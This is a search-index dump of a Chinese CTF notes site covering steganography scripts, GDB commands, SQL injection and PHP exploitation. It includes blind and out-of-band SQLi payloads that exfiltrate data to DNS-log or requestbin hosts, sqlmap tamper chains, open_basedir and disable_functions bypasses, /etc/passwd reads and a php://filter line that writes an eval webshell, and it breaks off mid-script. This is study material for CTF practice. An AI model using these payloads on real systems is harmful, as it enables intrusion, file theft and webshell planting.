{"./":{"url":"./","title":"About","keywords":"","body":"Eki's CTF notes Eki's CTF notes 记录我的CTF生涯 Contact: E-mail:eki@ieki.xyz Blog: ieki.xyz Wechat: Eki-home Github: EkiXu 本站所有文章均采用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议进行许可。 转载请注明出处。 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/":{"url":"library/","title":"Library","keywords":"","body":"CTF 知识库 CTF 知识库 MISC 隐写 损坏修复 流量分析 CRYPTO 古典密码 DES，AES RSA REVERSE 暴力分析 WEB SQL注入 绕过技巧 注入参数fuzz工具 Arjun PWN Shellcode 栈溢出 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/steganography.html":{"url":"library/steganography.html","title":"Steganography","keywords":"","body":"隐写术图片隐写直接隐写文件内隐写加密隐写outguess 隐写silenteye 隐写文件“上”隐写双图片隐写双图层文本隐写文本分析二进制隐写base64隐写snow 隐写pyc 隐写whitespace隐写零宽字符隐写音频隐写音频LSB隐写频谱图隐写无线电相关SSTV信号文件系统隐写NTFS 隐写隐写术 图片隐写 常用到的工具 binwalk foremost stegSolve stegdetect outguess JPHS zsteg Photoshop 直接隐写 exif隐写 Tool: exiftool 直接在图片属性中放置flag 文件内隐写 在图片文件尾部放置flag 解决方法 使用winhex打开查找 扩展： 在文件尾嵌入zip，rar等文件 解决方法 使用binwalk检测 foremost 分离 加密隐写 LSB隐写 原理 LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，此方法中每个像素可以携带3比特的信息。解决方法 使用stegSolve 查看各通道显示的图像 查看异常通道 使用Analyse->DataExtract 查看是否存在flag 扩展 以图象方式嵌入flag或对应二维码进行进一步解密 outguess 隐写 原理 利用JPEG的DCT系数的冗余 解决方法 使用outguess 工具解密 silenteye 隐写 主要利用LSB 文件“上”隐写 部分显示图片 原理 PNG IHDR 前8字节的内容可以更改一张图片的高度或者宽度使得一张图片显示不完整从而达到隐藏信息的目的 解决办法 Kali中不可以打开，提示文件头错误，而Windows自带的图片查看器可以打开，就提醒了我们IHDR被人篡改过 利用winhex 修改文件头使图片完全显示 JPG也可能隐藏宽高 GIF 时间轴隐藏 原理 由于GIF的动态特性，由一帧帧的图片构成，所以每一帧的图片，多帧图片间的结合，都成了隐藏信息的一种载体。解决方法 利用Photoshop 或者 StegSolve的 Analyse -> Frame Brower 双图片隐写 双图片异或和 解决方法 StegSolve的 Analyse -> Imgine Combiner 双图层 解决方法 PS分离 文本隐写 文本分析 https://www.fontspace.com/unicode/analyzer 二进制隐写 直接winhex打开看。。。。 base64隐写 解密脚本 #!/usr/bin/python import sys def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return res def solve_stego(): with open('stego.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\\n', '') norm_line = line.replace('\\n', '').decode('base64').encode('base64').replace('\\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print (res_str) solve_stego() 加密脚本 # coding:UTF8 import base64 import string def decode(flag1): # 把需要隐藏的密文变成二进制字符串 list_flag1 = list(flag1) # 把密文转为list例如：['I', ' ', 'a', 'm', ' ', 'a', ' ', 'C', 'T', 'F', 'e', 'r'] list_dec_flag1 = [] # 十进制密文例如：[73, 32, 97, 109, 32, 97, 32, 67, 84, 70, 101, 114] for j in range(len(list_flag1)): # 把ascii码密文转换为十进制密文list list_dec_flag1.append(ord(list_flag1[j])) list_bin_flag1 = [] # 二进制密文例如：['1001001', '100000', '1100001', '1101101', '100000', '1100001', '100000', '1000011','1010100'...] for j in range(len(list_dec_flag1)): # 把十进制密文转化为二进制密文 list_bin_flag1.append((bin(list_dec_flag1[j])[2:]).zfill(8)) str_bin_flag1 = ''.join(list_bin_flag1) # 把二进制密文list拼接成str # 例如：010010010010000001100001011011010010000001100001001000000100001101010100010001100110010101110010 list_bin_every_flag1 = list(str_bin_flag1) # 把str二进制密文转换成list # 例如：['1', '0', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '0', '1'...] return list_bin_every_flag1 if __name__ == '__main__': dic = string.uppercase+string.lowercase+string.digits+'+/' # a = raw_input() flag = ':-)There is no flag,but a cute key:\\\"hmz\\\"' list_bin_every_flag = decode(flag) # list二进制密文 # print len(list_bin_every_flag) # 例如：['1', '0', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '0', '1'...] tip = 0 # 定义一个指针指向要写入base64的list二进制密文 # tt = 0 #stego = open('stego.txt','w') with open('stego.txt', 'rb') as h: # 打开明文 file_lines = h.readlines() # 把明文读取成一行 # 例如：['#include \\r\\n', '#include \\r\\n', 'main(){int i,n[]={(((1 \\r equal_sign_num = 3 - (len(normal_line) % 3) # 每行base64加密后的等号数量 if equal_sign_num == 3: # 如果是3的倍数说明这一句没法进行隐写 equal_sign_num = 0 # 设其等号数量为0 # print 'equal_sign_num', equal_sign_num # tt += equal_sign_num * 2 # print tt, 'tt' list_normal_line = decode(normal_line) # 把明文也装换为list_bin_every_明文 # print list_normal_line if equal_sign_num == 1: # 一个等号 for i in range(2): # print 'tip', tip, 'list_bin_every_flag[tip]',list_bin_every_flag[tip] list_normal_line.append(list_bin_every_flag[tip]) tip += 1 # print list_normal_line elif equal_sign_num == 2: # 两个等号 for i in range(4): # print 'tip', tip, 'list_bin_every_flag[tip]', list_bin_every_flag[tip] list_normal_line.append(list_bin_every_flag[tip]) tip += 1 # print list_normal_line # print tt str_bin_normal_line = ''.join(list_normal_line) # print str_bin_normal_line b64 = '' for i in range(0, len(str_bin_normal_line), 6): b64 += dic[int(str_bin_normal_line[i: i+6], 2)] # 以6位为单位对照base64编码表 if equal_sign_num == 1: b64 += '=' elif equal_sign_num == 2: b64 += '==' print b64 snow 隐写 pyc 隐写 whitespace隐写 零宽字符隐写 http://zero.rovelast.com/ https://330k.github.io/misc_tools/unicode_steganography.html 音频隐写 音频LSB隐写 频谱图隐写 无线电相关 SSTV信号 文件系统隐写 NTFS 隐写 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/gdb-tutorial.html":{"url":"library/gdb-tutorial.html","title":"GDB Tutorial","keywords":"","body":"GDB 使用GDB命令简表GDB 使用 GDB命令简表 命令 解释 示例 file 加载被调试的可执行程序文件。 因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。 (gdb) file gdb-sample r Run的简写，运行被调试的程序。 如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。 (gdb) r c Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。 (gdb) c b b b bd [编号] b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。 其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb) b 8 (gdb) b main (gdb) b_main (gdb) b_0x804835c(gdb) d s, n s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数； n: 执行一行源程序代码，此行代码中的函数调用也一并执行。s 相当于其它调试器中的“Step Into (单步跟踪进入)”； n 相当于其它调试器中的“Step Over (单步跟踪)”。这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。 (gdb) s (gdb) n si, ni si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。 (gdb) si (gdb) ni p Print的简写，显示指定变量（临时变量或全局变量）的值。 (gdb) p i (gdb) p nGlobalVar display ...undisplay display，设置程序中断后欲显示的数据及其格式。 例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令 “display /i $pc” 其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。undispaly，取消先前的display设置，编号从1开始递增。 (gdb) display /i $pc(gdb) undisplay 1 i Info的简写，用于显示各类信息，详情请查阅“help i”。 (gdb) i r q Quit的简写，退出GDB调试环境。 (gdb) q x / examine的x 来查看内存地址中的值。n表示要显示的内存单元的个数f表示显示方式, 可取如下值x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。i 指令地址格式c 按字符格式显示变量。f 按浮点数格式显示变量。u表示一个地址单元的长度b表示单字节，h表示双字节，w表示四字节，g表示八字节 (gdb) /sw $eax help [命令名称] GDB帮助命令，提供对GDB名种命令的解释说明。 如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。 (gdb) help display -tui使用图形界面启动 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/sqli.html":{"url":"library/sqli.html","title":"SQL Inject","keywords":"","body":"SQli注入方式报错注入联合注入堆叠注入盲注绕过方式关于Mysql空白字符绕过EXP报错溢出关于Sqlite利用 \" ' ` [] 可以包裹列名的特性绕过md5 绕过SQLMAP代理注入利用SQLMAP FUZZJDBC 注入参考资料SQli 常规方法利用information_schema #爆库 select database() #爆表 select group_concat(table_name) from information_schema.tables where table_schema= #爆字段 select group_concat(column_name) from information_schema.columns where table_name= #爆数据 select group_concat() from mysql > 5.6 版本 利用sys库 # 爆表 # schema_auto_increment_columns select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+ # schema_table_statistics_with_buffer select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+ mysql > 5.5 利用innodb_table_stats # 爆表 select group_concat(table_name) from mysql.innodb_table_stats 注入方式 报错注入 updatexml(1,concat(1,()),1) extractvalue(1,concat(1,)) 联合注入 union select 堆叠注入 利用show show databases; show tables; 利用set prepare set @t=();prepare x from @t;execute x;# 利用handler(MySQL) 语法结构 HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | = | } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE Example: handler open as ; #指定数据表进行载入并将返回句柄重命名 handler read first; #读取指定表/句柄的首行数据 handler read next; #读取指定表/句柄的下一行数据 ... handler close; #关闭句柄 盲注 时间盲注 时间盲注 和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据 利用SLEEP(n) 绕过 benchmark(1000000,sha(1)) pow(99,99) SELECT count(*) FROM information_schema.tables A,information_schema.columns B,information_schema.tables C #payload=\"if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)--+\".format(sql,i,mid) #payload=\"and case when (ascii(substr({},{},1))>{}) then (benchmark(1000000,sha(1))) else 2 end\".format(sql,i,mid) #payload=\"if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)\".format(sql,i,mid) 参考资料：https://www.anquanke.com/post/id/170626 布尔盲注 利用if() ,like,or,>,=, > 可以用 greatest + = 绕过 #payload=\"0^((ascii(substr(({0}),{1},1)))>{2})^0#\".format(sql,i,mid) #payload=\"0^((ascii(mid(({0}),{1},1)))>{2})^0#\".format(sql,i,mid) #payload=\"if((ascii(substr(({0}),{1},1)))>{2},1,0)\".format(sql,i,mid) #payload=\"union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#\".format(sql,i,mid) 带外盲注 dblink postgresql #poc = \"\"\"a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=p password=1 dbname=ans{' || (%s) || '}d')) --\"\"\" % (sql) #poc = \"\"\"a' UNION SELECT 1,(SELECT dblink_connect('host=z' || (%s) || 'z.bb958293c85e2e52148a.d.requestbin.net user=p password=1 dbname=ans')) --\"\"\" % (sql) load_file mysql select load_file(concat('\\\\\\\\', (), '.your-dnslog.com')); 绕过方式 加()、/**/ bypass空格 无列名注入考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格 MariaDB [test]> select * from persons; +------+----------+-----------+--------------+--------+ | ID | LastName | FirstName | Address | Credit | +------+----------+-----------+--------------+--------+ | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 2 | Xill | Hiler | Like 10 | 100.67 | | 2 | Eki | Hiler | Nanfen 10 | 100.67 | +------+----------+-----------+--------------+--------+ -> MariaDB [test]> select 1,2,3,4,5 union select * from persons; +------+-------+-------+--------------+--------+ | 1 | 2 | 3 | 4 | 5 | +------+-------+-------+--------------+--------+ | 1 | 2 | 3 | 4 | 5 | | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 2 | Xill | Hiler | Like 10 | 100.67 | | 2 | Eki | Hiler | Nanfen 10 | 100.67 | +------+-------+-------+--------------+--------+ 然后就可以套娃拿数据了,注意a这个别名(任意内容)是必须的（新生成的表） MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a; +-------+ | 2 | +-------+ | 2 | | Gates | | Xill | | Eki | +-------+ 或者也可以将数字换成别名 在反引号不可用的情况下 MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a; +-------+ | b | +-------+ | 2 | | Gates | | Xill | | Eki | +-------+ like bypass = \"%\" 可用于定义通配符（模式中缺少的字母） 从 \"Persons\" 表中选取居住在以 \"g\" 结尾的城市里的人 SELECT * FROM Persons WHERE City LIKE '%g' 利用双hex(保证纯数字字符)注入 '%2B(select hex(hex(database())))%2B'0 GBK编码下 addslash() 绕过 宽字节绕过 %df%27 原理就是 addslash后变成%df%5c%27了 看回显点 select 1,2,3,.... 注释符 /**/ \\# -> %23 -- order by看字段数 先看看有几个回显点也可以用group by 1' order by 3# -> 1' order by 4# -> Error limit limit i,n # tableName：表名 # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i # n：为查询结果返回的数量 # i与n之间使用英文逗号\",\"隔开 修改 ||(或)运算符为字符串连接符 set sql_mode=PIPES_AS_CONCAT; substr被过滤 left(str,index) //从左边第index开始读取 right(str,index) //从右边index开始读取 mid(str,index,len)//从index开始截取str,截取len的长度 substring(strd,index) //从左边index开始读取 lpad(str, padded_length, [ pad_str ] )//在str左填充给定的pad_str到指定的长度len,返回len个字符 rpad(str, padded_length, [ pad_str ] )//在str右填充给定的pad_str到指定的长度len,返回len个字符 ascii被过滤 hex() ord() bin() load_file dnslog注入 poc: select load_file(concat('\\\\\\\\', (), '.your-dnslog.com')); 逗号绕过 对于substr()和mid()这两个方法可以使用from to的方式来替代逗号分隔的参数 limit 用offset绕过 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select user() like 'r%' -- 匹配r开头 无列名盲注绕过： select c from (select * from (select 1 `a`)m join (select 3 `b`)n join (select 4 `c`)p join (select 5 `d`)q join (select 6 `e`)r where 0 union select * from minil_users1 )x limit 1 offset 2 空格绕过 mysql查询的时候将会忽略字符串尾部的空格 格式化字符串逃逸 % https://zhuanlan.zhihu.com/p/115777073 order by 盲注 利用不同的order by 返回的结果盲注 类似 bool盲注 https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/ 利用 order by的特性进行盲注 MariaDB [test]> select * from users union select 1,2,3 order by 3; +----+----------+----------+ | Id | username | password | +----+----------+----------+ | 1 | 2 | 3 | | 1 | admin | admin | | 2 | eki | test123 | +----+----------+----------+ 3 rows in set (0.001 sec) MariaDB [test]> select * from users union select 1,2,'~' order by 3; +----+----------+----------+ | Id | username | password | +----+----------+----------+ | 1 | admin | admin | | 2 | eki | test123 | | 1 | 2 | ~ | +----+----------+----------+ select * from users2 where 1 group by password with rollup having password is NULL; 利用 with rollup 的特性构造字段 NULL 绕过验证 MariaDB [test]> select * from users2 where 1 group by 1 with rollup; +----+----------+----------+-------+ | Id | username | password | token | +----+----------+----------+-------+ | 1 | eki | test123 | 233 | | 2 | admin | admin | 233 | | NULL | admin | admin | 233 | +----+----------+----------+-------+ MariaDB [test]> select * from users2 where 1 group by 2 with rollup; +----+----------+----------+-------+ | Id | username | password | token | +----+----------+----------+-------+ | 2 | admin | admin | 233 | | 1 | eki | test123 | 233 | | 1 | NULL | test123 | 233 | +----+----------+----------+-------+ MariaDB [test]> select * from users2 where 1 group by password with rollup having password is NULL; +----+----------+----------+-------+ | Id | username | password | token | +----+----------+----------+-------+ | 1 | eki | NULL | 233 | +----+----------+----------+-------+ group by + with rollup 绕过二次密码检验 分组rollup后参数为NULL 关于Mysql 空白字符绕过 在php中\\s会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20 但是在mysql中空白字符为 0x09,0x0a,0x0b,0x0c,0x0d,0x20,0xa0 可以实现空白字符绕过 EXP报错溢出 mysql> select exp(709); +-----------------------+ | exp(709) | +-----------------------+ | 8.218407461554972e307 | +-----------------------+ 1 row in set (0.00 sec) mysql> select exp(710); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)' 关于Sqlite sqlite每个db文件就是一个数据库，不存在information_schema数据库，但存在类似作用的表sqlite_master。 该表记录了该库下的所有表，索引，表的创建sql select group_concat(name) from sqlite_master where type='table' #读取表名 select group_concat(sql) from sqlite_master where type='table' and name='' #读取字段 OR EXISTS({0} LIKE \\\"{1}%\\\" limit 1).format(sql,tmp) #匹配以{1}开头的数据 在sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 -9223372036854775808 (0x8000000000000000) 就会报错，同样如果是正数也会报错 与mysql不同 sqlite中十六进制会被转换为十进制 所以sqlite中字符串无法使用十六进制绕过 但是仍可以使用函数绕过，但因不存在mysql中ord,ascii等，sqlite中应该使用char与hex select * from sqlite_master where type=char(0x74,0x61,0x62,0x6c,0x65); select * from sqlite_master where type='table'; bypass if select case (1) when 1 then 2 else 0 select ifnull(nullif(1,2),3) ifnull(X,Y) The ifnull() function returns a copy of its first non-NULL argument, or NULL if both arguments are NULL. Ifnull() must have exactly 2 arguments. The ifnull() function is equivalent to coalesce() with two arguments. nullif(X,Y) The nullif(X,Y) function returns its first argument if the arguments are different and NULL if the arguments are the same. The nullif(X,Y) function searches its arguments from left to right for an argument that defines a collating function and uses that collating function for all string comparisons. If neither argument to nullif() defines a collating function then the BINARY is used. 利用 \" ' ` [] 可以包裹列名的特性绕过 select Name from User -> Name Eki John Alice select [Name][123] from User -> 123 Eki John Alice Example CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type); table_name=[abc]as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=1 -> $sql = \"CREATE TABLE [abc] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 1);\"; -> create table [abc] as select sql from sqlite_master md5 绕过 ffifdyop 经过md5加密后：276f722736c95d99e921722cf9ed621c 再转换为字符串：'or'6 即 'or'66�]��!r,��b 类似的还有12958192621165157191246674165187868492 SQLMAP 基本流程 POST存个post报文test然后-p注入的参数 sqlmap -r test.txt -p id 直接用url GET这样写 sqlmap -u http://xxx.xxx/?id=1 -p id --batch使用默认设置 一些常用的命令 sqlmap -u url --dbs //爆数据库 sqlmap -u url --current-db //爆当前库 sqlmap -u url --current-user //爆当前用户 sqlmap -u url --users查看用户权限 sqlmap -u url --tables -D数据库 //爆表段 sqlmap -u url --columns -T表段 -D 数据库 //爆字段 sqlmap -u url --dump -C字段 -T 表段 -D 数据库 //猜解 sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解1到3的字段 常用的一些tamper space2comment,randomcase 写一个简单的temper # sqlmap/tamper/backquotes.py from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOWEST def dependencies(): pass def tamper(payload, **kwargs): return \"1`,\"+payload+\")#\" 代理注入 example: from flask import Flask,request import requests purl = \"http://xxx\" app = Flask(__name__) @app.route('/') def index(): status=request.args.get('a') headers = { 'Host': 'xxx.xxx', 'Connection': 'close', 'Status': status, 'DNT': '1', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36', 'sec-ch-ua': '\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"', 'Accept': '*/*', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'http://xxx/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', } res = requests.get('https://xxx/server.php', headers=headers, verify=False) return res.text if __name__ == '__main__': app.run(host=\"0.0.0.0\",debug=True,port=8000) 这样就可以sqlmap本地服务来对远程服务进行注入，方便指定真实注入点和控制参数 利用SQLMAP FUZZ 无脑叠tamper就行 普通tamper搭配方式: tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes 数据库为MSSQL的搭配方式: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes 数据库为MySql的搭配方式: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversi JDBC 注入 jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT 参考资料 对MYSQL注入相关内容及部分Trick的归类小结 https://xz.aliyun.com/t/7169 sqlite 全函数查询 https://www.sqlite.org/lang_corefunc.html sqlmap tamper的使用 https://www.cnblogs.com/r00tuser/p/7252796.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/php/function.html":{"url":"library/php/function.html","title":"Functions","keywords":"","body":"PHP中的重要函数open_basedir绕过扩展资料Bypass disabled_functionLD_PRELOADphp 7.4 FFIrequire_oncefile_get_contentpreg_matchis_numeric()eregiPHP中的重要函数 open_basedir绕过 chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag')); 分析：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ symlink 法 def exploit(f): #print f payload=\"\"\" error_reporting(E_ALL); chdir(\"/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3/\"); mkdir('./{0}/b/c/d/e/f/g/',0777,TRUE); symlink('./{0}/b/c/d/e/f/g','{1}'); ini_set('open_basedir','/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3:{2}/'); symlink('{1}/../../../../../../','{2}'); unlink('{1}'); echo base64_encode(file_get_contents('{2}{3}')); \"\"\".format(randomstr(),randomstr(),randomstr(),f) poc= payload.replace(\"\\n\",'') #print poc headers = { \"eki\":poc } req=requests.get(url,headers=headers) print req.text 扩展资料 https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/ Bypass disabled_function LD_PRELOAD 原理： PHP 的 putenv()函数，设定 LD_PRELOAD(环境变量) 为 hack.so。 利用 PHP 的 mail()函数，mail() 内部启动新进程 /usr/sbin/sendmail，因为上一步 LD_PRELOAD的作用，sendmail 调用的void()函数 被优先级更好的 hack.so 中的同名 getuid()函数所劫持。 Exp https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD php 7.4 FFI 根据官方文档FFI是可以直接调用系统函数的 比如这样 system(\"id > /tmp/eki\"); echo file_get_contents(\"/tmp/eki\"); @unlink(\"/tmp/eki\"); 但是FFI API仅能适用于预加载文件 require_once poc: php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd php源码分析 require_once 绕过不能重复包含文件的限制：https://www.anquanke.com/post/id/213235 file_get_content 关于file_put_contents的一些小测试: https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/ preg_match 修改htaccess参数 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 数组绕过 is_numeric() 用于判断是否是数字，通常配合数值判断 is_numeric(@$a[\"param1\"])?exit:NULL; if(@$a[\"param1\"]){ ($a[\"param1\"]>2017)?$v1=1:NULL; } $pos = array_search(\"nudt\",$a[\"param2\"]); $pos ==false?die(\"nope\"):NULL; foreach($a[\"param2\"] as $key=>$val){ $val===\"nudt\"?die(\"nope\"):NULL; } //param2中需要匹配到nudt然而是弱类型，0==任何字符串，用0可以过掉弱类型检查字符串 eregi 存在\\x00截断的问题 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/php/protocol.html":{"url":"library/php/protocol.html","title":"Protocol","keywords":"","body":"PHP中的协议利用php://inputdata://php://filter简单理解：string.strip_tagsconvert 转换过滤器参考资料PHP中的协议利用 php://input 接收POST RAW 需要打开 url_allow_fopen url_allow_include data:// data://text/plain, 需要打开 url_allow_fopen url_allow_include php://filter简单理解： php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西； 使用不同的参数可以达到不同的目的和效果： 名称 描述 备注 resource= 指定了你要筛选过滤的数据流 必选 read= 可以设定一个或多个过滤器名称，以管道符\"\\ \"分割 可选 write= 可以设定一个或多个过滤器名称，以管道符\"\\ “分割 可选 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 Trick： read 和write 里 可以塞垃圾字符 php://filter面对不可用的规则是报个Warning，然后跳过继续执行 string.strip_tags convert 转换过滤器 base64-encode/decode convert.iconv.* The convert.iconv.* filters are available, if iconv support is enabled, and their use is equivalent to processing all stream data with iconv(). These filters do not support parameters, but instead expect the input and output encodings to be given as part of the filter name, i.e. either as convert.iconv.. or convert.iconv./ (both notations are semantically equivalent). Example #3 convert.iconv.* 简单来说convert.iconv.*相当于调用了iconv() 可以看这个示例 利用: LFR/LFI php://filter/read=convert.base64-encode/resource=file.txt php://input + POST报文php代码 (allow_url_include=On) data://text/plain, (allow_url_include=On) 绕过死亡exit,关键词检测 Example: php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php 参考资料 谈一谈php://filter的妙用:https://www.leavesongs.com/PENETRATION/php-filter-magic.html php 可用过滤器列表 ：https://www.php.net/manual/en/filters.php 探索php://filter在实战当中的奇技淫巧 ： https://www.anquanke.com/post/id/202510 file_put_content和死亡·杂糅代码之缘 https://xz.aliyun.com/t/8163 关于file_put_contents的一些小测试 https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/php/ace.html":{"url":"library/php/ace.html","title":"ACE","keywords":"","body":"PHP 任意代码执行(ACE)相关变量覆盖析构函数利用文件名利用注释ByPass异或取反字符自增“数字”拼接无参数读文件PHP 任意代码执行(ACE)相关 利用字符串函数名执行特性 变量覆盖 析构函数 name); } } highlight_file(__FILE__); $user = new User; $user->name = $_GET['l1nk']; ?> 利用文件名 一般webshell是通过文件内容来查杀，因此我们可以利用一切非文件内容的可控值来构造webshell，譬如文件名 同理，除了文件名，还有哪些我们很容易可以控制的值呢？ 函数名也可。 同理方法名也可 systema(); 还有类名 __CLASS__ 什么的就不再多说了。 利用注释 PHP Reflection API 可以用于导出或者提取关于类 , 方法 , 属性 , 参数 等详细信息 . 甚至包含注释的内容。 getDocComment(); echo substr($rc->getDocComment(),-9,-3)($_GET['l1nk']); ?> ByPass 异或 payload=\"phpinfo\" allowed=\"ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz}~!#%*+-/:;?@\"# no () reth=\"\" rett=\"\" for c in payload: flag=False for i in allowed: if flag == False: for j in allowed: if ord(i)^ord(j)==ord(c): 